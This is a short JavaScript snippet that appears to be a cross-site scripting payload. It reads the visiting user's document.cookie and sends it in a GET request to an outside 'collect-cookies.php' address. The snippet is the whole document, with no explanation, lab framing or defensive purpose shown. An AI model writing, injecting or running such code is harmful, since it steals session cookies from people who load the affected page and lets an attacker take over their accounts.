var xhr = new XMLHttpRequest();
xhr.open(
'GET', 
'https://github.com/RachelWealth/chatgpt_clone_lavarel_vue/blob/main/collect-cookies.php?cookies=' + encodeURIComponent(document.cookie));
xhr.send();